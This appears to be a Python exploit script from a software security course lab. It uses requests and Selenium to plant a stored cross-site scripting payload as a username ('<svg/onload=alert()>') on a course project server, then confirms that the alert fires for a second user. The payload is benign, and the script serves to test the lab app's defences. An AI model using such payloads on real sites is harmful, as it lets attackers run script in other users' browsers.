import requests, sys, os, random
import time
from selenium_utils import start_driver, write_to_field

# SERVER = sys.argv[1]
SERVER = 'http://d39e092608f9769e2696bf07d987072b4b2dd1dc9bce5e0151910fc276ae.project.ssof.rnl.tecnico.ulisboa.pt/'

session = requests.session()

# Create a malicious user
payload = '<svg/onload=alert()>'
user = payload
password = str(random.randint(2**27, 2**28))

# Registration of the user
params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/register', data=params)

# Login of the user
params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

# Create a new post
params = {'content' : 'Random Post', 'type' : 'Public'}
r = session.post(SERVER + '/create_post', data=params, cookies=session.cookies)

# Create another user
user = str(random.randint(2**27, 2**28))
password = str(random.randint(2**27, 2**28))

# Registration of the user
params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/register', data=params)

# Use Selenium to check for the alert
driver = start_driver()
driver.get(SERVER)

# Login
write_to_field(driver, 'username', user)
write_to_field(driver, 'password', password + '\n')

# Verify and Handle alert
alert = driver.switch_to.alert
time.sleep(1)
assert "" in alert.text
alert.accept()

# Close Chrome
driver.close()